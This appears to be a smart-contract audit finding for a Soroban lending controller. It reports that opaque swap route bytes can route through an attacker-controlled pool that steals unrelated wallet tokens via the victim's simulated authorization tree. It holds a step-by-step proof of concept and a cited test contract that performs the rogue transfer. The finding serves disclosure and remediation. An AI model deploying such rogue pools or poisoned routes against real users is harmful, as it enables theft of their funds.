### Title
Untrusted strategy route XDR can steal unrelated wallet tokens through the caller's signed authorization tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
The controller accepts caller-supplied opaque `swap` bytes, forwards them to the configured swap router, and relies on measured controller input/output checks. A malicious but valid route can name an attacker-controlled venue contract in the payload's address registry. During route execution, that contract can invoke `token.transfer(victim, attacker, amount)` for an unrelated wallet asset; Soroban simulation records that transfer as a child of the victim's signed controller invocation. If the victim signs the resulting authorization tree, the unrelated tokens are transferred while the strategy still completes with a valid swap output.

### Finding Description
`swap_collateral(caller, account_id, current, amount, new, swap)` accepts arbitrary `swap: Bytes` after caller and account-owner authorization. [1](#0-0)  `process_swap_collateral` forwards those bytes into the shared swap path. [2](#0-1) 

`swap_tokens` authorizes only the intended controller-to-router input transfer, but passes the opaque payload directly to `router.execute_strategy`. [3](#0-2)  Its later checks only bound the controller's input spend, refund leftover input, and require positive measured output; they do not prevent route-selected third-party code from requesting additional authorization from the original caller. [4](#0-3) 

Inside the router payload, each swap instruction resolves `idx_a` as a pool address from the caller-controlled `assets` registry and dispatches to the selected venue implementation. [5](#0-4)  The packed format's `idx_a` is explicitly the pool address index, and validation checks index bounds but does not compare the address against an allowlist. [6](#0-5) [7](#0-6) 

The repository includes a regression test demonstrating this authorization behavior: a rogue hop contract calls `token.transfer(victim, attacker, amount)`, simulation attaches that transfer beneath the victim's `swap_collateral` authorization, and signing the poisoned tree moves the victim's entire unrelated wallet balance. [8](#0-7) [9](#0-8) [10](#0-9) 

### Impact Explanation
A crafted route can steal assets that are not strategy input, collateral, debt, or even protocol-listed tokens. The malicious venue can preserve the expected swap semantics and return at least the route minimum, so controller checks such as `RouterOverspend`, `NoSwapOutput`, final account risk, and token-chain consistency do not detect the unrelated wallet transfer. [11](#0-10) 

The same pattern is reachable through the other strategy entrypoints that accept route bytes: `multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral`. [12](#0-11) [13](#0-12) 

### Likelihood Explanation
This requires the victim to submit a transaction containing attacker-supplied route bytes and to sign the simulated authorization tree containing the extra transfer. That is more involved than a purely unauthenticated exploit, but route payloads are opaque bytes and can still produce a fair-looking swap, making phishing or malicious quote construction practical. The repository's test shows that an honest root-only authorization rejects the theft, while the tree produced by simulating the malicious route authorizes it. [14](#0-13) 

### Recommendation
Do not allow arbitrary payload-controlled contract addresses to be invoked below a user's authorization. Maintain an on-chain approved pool registry or otherwise decode and validate every route pool address before invoking `execute_strategy`. At minimum, require clients to decode the complete route and reject any simulated authorization tree containing calls other than the expected controller operation and exact input transfer; however, client-side inspection alone does not fix the contract-level trust boundary.

### Proof of Concept
1. Deploy a venue-compatible malicious pool whose swap entrypoint:
   - calls `token.transfer(victim, attacker, victim_wallet_balance)` on an unrelated token;
   - consumes the routed input expected by the selected venue;
   - returns enough output to satisfy the encoded `min_out`.
2. Build a `StrategyPayload` whose `assets` registry contains the malicious pool address and whose packed program uses that index as `idx_a`. [6](#0-5) 
3. Have a victim with an existing lending account submit:

   `swap_collateral(victim, account_id, usdc_key, amount, eth_key, malicious_route_xdr)`

4. Simulate the transaction. The rogue token transfer appears as a child invocation beneath the victim's `swap_collateral` authorization. [15](#0-14) 
5. If the poisoned authorization tree is signed, the unrelated wallet token reaches the attacker while the victim receives the expected new collateral. [10](#0-9)

### Citations

**File:** contracts/controller/src/lib.rs (L219-237)
```rust
    /// Borrows `debt_to_flash_loan`, swaps into `collateral` and deposits the
    /// proceeds. An `initial_payment` in collateral joins the deposit; one in debt
    /// joins `swap`; a third asset requires `convert_swap` or reverts with
    /// `ConvertStepsRequired`. Returns the account id; `account_id = 0` creates it.
    /// An existing account requires owner or delegate authorization and a matching mode.
    #[when_not_paused]
    fn multiply(
        env: Env,
        caller: Address,
        account_id: u64,
        spoke_id: u32,
        collateral: HubAssetKey,
        debt_to_flash_loan: i128,
        debt: HubAssetKey,
        mode: PositionMode,
        swap: Bytes,
        initial_payment: Option<(HubAssetKey, i128)>,
        convert_swap: Option<Bytes>,
    ) -> u64 {
```

**File:** contracts/controller/src/lib.rs (L255-318)
```rust
    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
    }

    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
    }

    /// Repays `debt` from `collateral`, netting directly for the same hub asset
    /// (`swap` must be empty) or converting otherwise. `close_position` withdraws
    /// all remaining collateral to the caller, reverting with
    /// `CannotCloseWithRemainingDebt` if any debt remains. Requires owner or
    /// delegate authorization.
    #[when_not_paused]
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-166)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
```

**File:** contracts/swap-aggregator/src/program.rs (L58-68)
```rust
/// Byte offsets within one instruction record.
mod field {
    pub(super) const OPCODE: usize = 0;
    pub(super) const MODE: usize = 1;
    /// Pool address index.
    pub(super) const POOL: usize = 2;
    /// Input token index, or the LP share token for a liquidity leg.
    pub(super) const TOKEN_IN: usize = 3;
    /// Output token index, or an `amounts` index for a liquidity leg.
    pub(super) const TOKEN_OUT: usize = 4;
}
```

**File:** contracts/swap-aggregator/src/program.rs (L281-291)
```rust
            if idx_a >= assets_len || idx_b >= assets_len {
                panic_with_error!(env, Error::InvalidRouteXdr);
            }
            match opcode {
                Opcode::Swap(_) => {
                    if idx_c >= assets_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_b == idx_c {
                        panic_with_error!(env, Error::SameToken);
                    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
